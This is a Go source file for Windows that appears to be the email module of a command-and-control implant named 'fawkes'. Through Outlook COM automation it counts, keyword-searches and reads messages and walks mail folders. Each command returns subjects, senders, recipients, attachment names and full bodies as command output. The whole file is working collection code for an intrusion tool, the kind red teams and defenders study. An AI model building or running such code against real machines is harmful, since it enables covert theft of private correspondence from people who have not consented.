//go:build windows

package commands

import (
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// emailCount returns the number of messages in a folder.
func emailCount(args emailArgs) structs.CommandResult {
	conn, cleanup, err := outlookConnect()
	if err != nil {
		return errorf("%v", err)
	}
	defer cleanup()

	folder, err := conn.getFolder(args.Folder)
	if err != nil {
		return errorf("%v", err)
	}
	defer folder.Release()

	itemsResult, err := oleutil.GetProperty(folder, "Items")
	if err != nil {
		return errorf("failed to get Items: %v", err)
	}
	items := itemsResult.ToIDispatch()
	defer items.Release()

	countResult, err := oleutil.GetProperty(items, "Count")
	if err != nil {
		return errorf("failed to get Count: %v", err)
	}

	folderName := args.Folder
	if folderName == "" {
		folderName = "Inbox"
	}

	nameResult, _ := oleutil.GetProperty(folder, "Name")
	if nameResult != nil {
		folderName = nameResult.ToString()
	}

	return successf("%s: %d messages", folderName, int(countResult.Val))
}

// emailSearch searches messages by keyword using Outlook Restrict filter.
func emailSearch(args emailArgs) structs.CommandResult {
	if args.Query == "" {
		return errorf("search requires -query parameter")
	}

	conn, cleanup, err := outlookConnect()
	if err != nil {
		return errorf("%v", err)
	}
	defer cleanup()

	folder, err := conn.getFolder(args.Folder)
	if err != nil {
		return errorf("%v", err)
	}
	defer folder.Release()

	itemsResult, err := oleutil.GetProperty(folder, "Items")
	if err != nil {
		return errorf("failed to get Items: %v", err)
	}
	items := itemsResult.ToIDispatch()
	defer items.Release()

	// Sort by ReceivedTime descending (most recent first)
	oleutil.CallMethod(items, "Sort", "[ReceivedTime]", true)

	// Use DASL filter for case-insensitive substring matching on Subject and Body
	escapedQuery := strings.ReplaceAll(args.Query, "'", "''")
	filter := fmt.Sprintf(
		`@SQL=("urn:schemas:httpmail:subject" LIKE '%%%s%%' OR "urn:schemas:httpmail:textdescription" LIKE '%%%s%%')`,
		escapedQuery, escapedQuery,
	)

	restrictResult, err := oleutil.CallMethod(items, "Restrict", filter)
	if err != nil {
		return errorf("Restrict filter failed: %v", err)
	}
	filtered := restrictResult.ToIDispatch()
	defer filtered.Release()

	countResult, err := oleutil.GetProperty(filtered, "Count")
	if err != nil {
		return errorf("failed to get filtered count: %v", err)
	}
	totalMatches := int(countResult.Val)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Search '%s': %d matches\n\n", args.Query, totalMatches))

	limit := args.Count
	if limit > totalMatches {
		limit = totalMatches
	}

	for i := 1; i <= limit; i++ {
		itemResult, err := oleutil.CallMethod(filtered, "Item", i)
		if err != nil {
			continue
		}
		msg := itemResult.ToIDispatch()
		writeMessageSummary(&sb, msg, i)
		msg.Release()
	}

	if totalMatches > limit {
		sb.WriteString(fmt.Sprintf("\n... and %d more matches (use -count to see more)\n", totalMatches-limit))
	}

	return successf("%s", sb.String())
}

// emailRead reads a specific message by index.
func emailRead(args emailArgs) structs.CommandResult {
	if args.Index <= 0 {
		return errorf("read requires -index parameter (1-based)")
	}

	conn, cleanup, err := outlookConnect()
	if err != nil {
		return errorf("%v", err)
	}
	defer cleanup()

	folder, err := conn.getFolder(args.Folder)
	if err != nil {
		return errorf("%v", err)
	}
	defer folder.Release()

	itemsResult, err := oleutil.GetProperty(folder, "Items")
	if err != nil {
		return errorf("failed to get Items: %v", err)
	}
	items := itemsResult.ToIDispatch()
	defer items.Release()

	// Sort by ReceivedTime descending (most recent first)
	oleutil.CallMethod(items, "Sort", "[ReceivedTime]", true)

	countResult, err := oleutil.GetProperty(items, "Count")
	if err != nil {
		return errorf("failed to get Count: %v", err)
	}
	total := int(countResult.Val)

	if args.Index > total {
		return errorf("index %d out of range (folder has %d messages)", args.Index, total)
	}

	itemResult, err := oleutil.CallMethod(items, "Item", args.Index)
	if err != nil {
		return errorf("failed to get message at index %d: %v", args.Index, err)
	}
	msg := itemResult.ToIDispatch()
	defer msg.Release()

	var sb strings.Builder

	subject := getOlePropStr(msg, "Subject")
	sender := getOlePropStr(msg, "SenderName")
	senderEmail := getOlePropStr(msg, "SenderEmailAddress")
	to := getOlePropStr(msg, "To")
	cc := getOlePropStr(msg, "CC")
	received := getOlePropTime(msg, "ReceivedTime")

	sb.WriteString(fmt.Sprintf("Subject: %s\n", subject))
	sb.WriteString(fmt.Sprintf("From: %s <%s>\n", sender, senderEmail))
	sb.WriteString(fmt.Sprintf("To: %s\n", to))
	if cc != "" {
		sb.WriteString(fmt.Sprintf("CC: %s\n", cc))
	}
	sb.WriteString(fmt.Sprintf("Received: %s\n", received))

	// Attachments
	attachResult, err := oleutil.GetProperty(msg, "Attachments")
	if err == nil {
		attachments := attachResult.ToIDispatch()
		attachCountResult, err := oleutil.GetProperty(attachments, "Count")
		if err == nil && int(attachCountResult.Val) > 0 {
			count := int(attachCountResult.Val)
			sb.WriteString(fmt.Sprintf("Attachments: %d\n", count))
			for i := 1; i <= count; i++ {
				aResult, err := oleutil.CallMethod(attachments, "Item", i)
				if err != nil {
					continue
				}
				a := aResult.ToIDispatch()
				name := getOlePropStr(a, "FileName")
				sizeResult, _ := oleutil.GetProperty(a, "Size")
				size := int64(0)
				if sizeResult != nil {
					switch v := sizeResult.Value().(type) {
					case int64:
						size = v
					case int32:
						size = int64(v)
					case int:
						size = int64(v)
					}
				}
				sb.WriteString(fmt.Sprintf("  [%d] %s (%d bytes)\n", i, name, size))
				a.Release()
			}
		}
		attachments.Release()
	}

	if !args.Headers {
		sb.WriteString("\n--- Body ---\n")
		body := getOlePropStr(msg, "Body")
		if body != "" {
			sb.WriteString(body)
		} else {
			sb.WriteString("(empty)")
		}
	}

	return successf("%s", sb.String())
}

// emailFolders lists all available Outlook folders.
func emailFolders() structs.CommandResult {
	conn, cleanup, err := outlookConnect()
	if err != nil {
		return errorf("%v", err)
	}
	defer cleanup()

	rootResult, err := oleutil.GetProperty(conn.namespace, "Folders")
	if err != nil {
		return errorf("failed to get root folders: %v", err)
	}
	rootFolders := rootResult.ToIDispatch()
	defer rootFolders.Release()

	var sb strings.Builder
	sb.WriteString("Outlook Folders:\n")
	listFolders(&sb, rootFolders, 0)
	return successf("%s", sb.String())
}

// listFolders recursively lists folder names with indentation.
func listFolders(sb *strings.Builder, folders *ole.IDispatch, depth int) {
	countResult, err := oleutil.GetProperty(folders, "Count")
	if err != nil {
		return
	}
	count := int(countResult.Val)

	indent := strings.Repeat("  ", depth)
	for i := 1; i <= count; i++ {
		itemResult, err := oleutil.CallMethod(folders, "Item", i)
		if err != nil {
			continue
		}
		folder := itemResult.ToIDispatch()

		name := getOlePropStr(folder, "Name")

		// Get item count for this folder
		itemsResult, err := oleutil.GetProperty(folder, "Items")
		itemCount := 0
		if err == nil {
			items := itemsResult.ToIDispatch()
			cResult, err := oleutil.GetProperty(items, "Count")
			if err == nil {
				itemCount = int(cResult.Val)
			}
			items.Release()
		}

		sb.WriteString(fmt.Sprintf("%s%s (%d)\n", indent, name, itemCount))

		// Recurse into subfolders
		subResult, err := oleutil.GetProperty(folder, "Folders")
		if err == nil {
			subFolders := subResult.ToIDispatch()
			listFolders(sb, subFolders, depth+1)
			subFolders.Release()
		}
		folder.Release()
	}
}

// writeMessageSummary writes a one-line summary of a message.
func writeMessageSummary(sb *strings.Builder, msg *ole.IDispatch, index int) {
	subject := getOlePropStr(msg, "Subject")
	sender := getOlePropStr(msg, "SenderName")
	received := getOlePropTime(msg, "ReceivedTime")

	if len(subject) > 60 {
		subject = subject[:57] + "..."
	}

	sb.WriteString(fmt.Sprintf("[%d] %s | %s | %s\n", index, received, sender, subject))
}

// getOlePropStr safely gets a string property from a COM object.
func getOlePropStr(disp *ole.IDispatch, name string) string {
	result, err := oleutil.GetProperty(disp, name)
	if err != nil || result == nil {
		return ""
	}
	return result.ToString()
}

// getOlePropTime safely gets a time property and formats it.
func getOlePropTime(disp *ole.IDispatch, name string) string {
	result, err := oleutil.GetProperty(disp, name)
	if err != nil || result == nil {
		return ""
	}
	// OLE DATE is stored as float64 (VT_DATE)
	if t, ok := result.Value().(time.Time); ok {
		return t.Format("2006-01-02 15:04:05")
	}
	return result.ToString()
}
